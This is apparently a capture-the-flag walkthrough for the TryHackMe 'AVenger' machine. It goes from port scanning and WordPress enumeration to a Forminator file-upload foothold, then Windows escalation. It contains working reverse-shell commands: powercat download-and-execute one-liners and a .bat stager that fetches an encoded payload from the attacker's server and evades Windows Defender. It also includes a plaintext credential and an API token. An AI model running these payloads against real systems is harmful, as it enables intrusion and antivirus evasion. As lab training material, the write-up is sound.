# AVenger



## Ports Scanning

For this machine we have to use a more stealth command due AV enable.

```bash
nmap -sC -sV --min-rate 1000 10.10.57.181 -oN port_scan.txt

Nmap scan report for 10.10.57.181
Host is up (0.042s latency).
Not shown: 992 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Index of /
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp  open  ssl/http      Apache httpd 2.4.56 (OpenSSL/1.1.1t PHP/8.0.28)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 3.5K  2022-06-15 16:07  applications.html
| 177   2022-06-15 16:07  bitnami.css
| -     2023-04-06 09:24  dashboard/
| 30K   2015-07-16 15:32  favicon.ico
| -     2023-06-27 09:26  gift/
| -     2023-06-27 09:04  img/
| 751   2022-06-15 16:07  img/module_table_bottom.png
| 337   2022-06-15 16:07  img/module_table_top.png
| -     2023-06-28 14:39  xampp/
|_
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-title: Index of /
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
3306/tcp open  mysql         MariaDB 5.5.5-10.4.28
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.4.28-MariaDB
|   Thread ID: 10
|   Capabilities flags: 63486
|   Some Capabilities: ODBCClient, Support41Auth, SupportsLoadDataLocal, Speaks41ProtocolNew, ConnectWithDatabase, SupportsCompression, SupportsTransactions, IgnoreSpaceBeforeParenthesis, FoundRows, LongColumnFlag, InteractiveClient, IgnoreSigpipes, DontAllowDatabaseTableColumn, Speaks41ProtocolOld, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: Nw207dp*|Vws\QbyX-w1
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=gift
| Not valid before: 2025-07-23T20:24:16
|_Not valid after:  2026-01-22T20:24:16
| rdp-ntlm-info: 
|   Target_Name: GIFT
|   NetBIOS_Domain_Name: GIFT
|   NetBIOS_Computer_Name: GIFT
|   DNS_Domain_Name: gift
|   DNS_Computer_Name: gift
|   Product_Version: 10.0.17763
|_  System_Time: 2025-07-24T20:25:04+00:00
|_ssl-date: 2025-07-24T20:25:13+00:00; +1s from scanner time.
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Hosts: localhost, www.example.com; OS: Windows; CPE: cpe:/o:microsoft:windows

```



## Web Enumeration

<figure><img src="../../../.gitbook/assets/image (319).png" alt=""><figcaption></figcaption></figure>



If we try to enter in the `gift/` directory, the domain will change in this:

<figure><img src="../../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

add this domain to `/etc/hosts` to view the site.

Try to enumerate with dir/file discovering.

{% code overflow="wrap" %}
```bash
gobuster dir -u http://avenger.tryhackme/gift/ -w /usr/share/wordlists/SecLists_custom/raft-large-directories.txt -b 403,404

/admin                (Status: 302) [Size: 0] [--> http://avenger.tryhackme/gift/wp-admin/]
/wp-content           (Status: 301) [Size: 357] [--> http://avenger.tryhackme/gift/wp-content/]
/wp-admin             (Status: 301) [Size: 355] [--> http://avenger.tryhackme/gift/wp-admin/]
/wp-includes          (Status: 301) [Size: 358] [--> http://avenger.tryhackme/gift/wp-includes/]
```
{% endcode %}

### Wordpress Login Brute Forcing

These route bring you to `wp-login` portal.

<figure><img src="../../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

Checking with wafw00f tool we can view that the site not has a WAF enabled.

```bash
wafw00f http://avenger.tryhackme/gift/wp-login.php

[*] Checking http://avenger.tryhackme/gift/wp-login.php
[+] Generic Detection results:
[-] No WAF detected by the generic detection # <--
[~] Number of requests: 7
```

Trying to enter with a admin:admin credentials we can notice that a message appair, tell us that the user admin exists.

<figure><img src="../../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

So, knowing that the site not has WAF enabled and we have already know a user valid, we could do a brute force to guessing the password of admin user.

Nothing found :(

### WPScan

Try to run e WPScan to detect some vulnerability.

{% code overflow="wrap" %}
```bash
wpscan --url http://avenger.tryhackme/gift/ --api-token eVAkNLx5URNVNRP2xj1Uxon9CWFslz5Aas8bWb5jcO8 --random-user-agent -v
```
{% endcode %}

From this we can notice that the File Upload is managed by Forminator Plugin. That reading from readme of the plugin is not updated.

<figure><img src="../../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

Searching online there are some vulnerabilities, but in particulary there is a Unauthentication File Upload and RCE.

{% embed url="https://www.exploit-db.com/exploits/51664" %}

If we upload a file in the form we can see this message.

<figure><img src="../../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

This make us think that any files will upload a person will open it. So, we can upload a file to establish a revshell.

### Forminator Plugin RCE - AV Bypass

We can consider that the Windows Server machine has AV Windows Defender enabled.

And if the upload a simple file with a rev shell, this won't works.

Reading this article, we have a method to bypass the AV.

{% embed url="https://systemweakness.com/evade-windows-defender-reverse-shell-detection-6fa9f5eee1d1" %}

{% content-ref url="../../../pt/executive-pt/post-exploitation/shells/av-bypass-shell.md" %}
[av-bypass-shell.md](../../../pt/executive-pt/post-exploitation/shells/av-bypass-shell.md)
{% endcontent-ref %}

Follow the above pages we obtained the reverse shell bypassing Windows Defender.

Create the encoded RevShell to host in a Http server.&#x20;

```bash
LHOST=10.23.52.142
LPORT=9009
rshell=shell.txt
pwsh -c "iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c $LHOST -p $LPORT -e cmd.exe -ge" > /tmp/$rshell
```

```bash
python3 -m http.server 80
```

Now create the .bat file that will be open by a support user.

```bash
LHOST=10.23.52.142
LPORT_web=80
rshell=shell-9009.txt
echo START /B powershell -c "\$code=(New-Object System.Net.Webclient).DownloadString('http://${LHOST}:${LPORT_web}/${rshell}');iex 'powershell -E \$code'" >/tmp/backup.bat 
```

Lastly start a listener

```bash
rlwrap nc -nlvp 9009
```

Upload the file and when it will be open we will obtain a RevShell.

<figure><img src="../../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

Now we can print the user flag.

```powershell
more C:\Users\hugo\Desktop\user.txt
```



## Privilege Escalation

During the local windows enumeration, we noticed that the user hugo is in the Administrator group

```powershell
net localgroup administrators

Members
------------------------
Administrator
hugo
```



```
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
```

```
evil-winrm -i 10.10.15.209 -u 'hugo' -p 'SurpriseMF123!' 
```



Bypass UAC to run program with Administrator privilege.

Follow this page:

{% content-ref url="../../../pt/executive-pt/post-exploitation/windows-post-exploitation/windows-privilege-escalation/uac-bypass.md" %}
[uac-bypass.md](../../../pt/executive-pt/post-exploitation/windows-post-exploitation/windows-privilege-escalation/uac-bypass.md)
{% endcontent-ref %}

